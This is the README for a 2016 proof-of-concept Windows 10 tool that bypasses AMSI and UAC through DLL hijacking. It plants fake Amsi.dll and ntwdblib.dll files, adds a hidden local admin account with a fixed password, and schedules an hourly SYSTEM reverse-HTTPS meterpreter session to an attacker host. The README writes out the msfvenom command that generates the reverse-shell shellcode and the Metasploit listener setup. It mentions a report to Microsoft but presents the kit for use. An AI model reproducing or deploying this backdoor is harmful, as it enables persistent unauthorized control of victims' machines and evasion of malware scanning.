       _______         .__     ____  __.__.__  .__                
______ \   _  \   _____|  |__ |    |/ _|__|  | |  |   ___________ 
\____ \/  /_\  \ /  ___/  |  \|      < |  |  | |  | _/ __ \_  __ \
|  |_> >  \_/   \\___ \|   Y  \    |  \|  |  |_|  |_\  ___/|  | \/
|   __/ \_____  /____  >___|  /____|__ \__|____/____/\___  >__|   
|__|          \/     \/     \/        \/                 \/       
						By Cn33liz - 2016

Windows 10 PowerShell5 - Amsi/UAC Bypass/Backdoor/Exploit using DLL Hijacking

Proof of Concept exploit to bypass Microsoft latest AntiMalware Scan Interface technology within powershell5 on Windows 10.
With this exploit/patch applied, you can take control over powershells program flow by using DLL Hijacking and UAC Bypass techniques.
Every time powershell is started, a local admin named BadAss with password FacePalm01 will be added to the system (when run by an non elevated administrator account) 
and a reverse (SYSTEM) https meterpreter session (default 192.168.1.120) will be started every hour using a scheduled task.

Current status: 

* Reported to MSRC on 28-03-2016
* From Microsoft perspective AMSI/AntiVirus isn't a traditional security boundary. 

Requirements:

* A Windows 10 Box with latest security patches applied.
* Default UAC settings.
* Local administrator privileges to apply the patch (no need for elevation because Exploit uses UAC bypass to patch Amsi/Powershell).
* A remote https reversed meterpreter listener.
* A p0sh Fanboy that uses powershell on his system ;)

This Exploit contains 5 components (and 1 python script):

p0shKiller.exe	- The main tool to apply the Patch (only needed once).
UacBypass.dll	- Will be injected into explorer.exe process and uses IFileOperation (COM Interface) to copy needed DLL's (only needed once).
Amsi.dll	- This fake DLL is copied into: C:\Windows\System32\WindowsPowerShell\v1.0, and is the main vulnerable component. 
ntwdblib.dll	- Fake ntwdblib.dll copied into C:\Windows\System32, which is used by cliconfg.exe (elevated process) to bypass UAC.
MPAmsiRun.exe	- Xor'ed Meterpreter Shellcode payload that is copied into C:\Windows\System32 and called by Amsi.dll.

XORMeter.py	- Python Script to generate your own Meterpreter Payload (MPAmsiRun.exe) By @vvalien1

The following shellcode is used as payload and compiled within the code:
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.120 LPORT=443 EXITFUNC=thread -f hex > Shellcode.txt

Setup your remote msf listener:

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set AutoRunScript post/windows/manage/priv_migrate
exploit -j

* Parts of this code has been borrowed from: https://github.com/hjc4869/UacBypass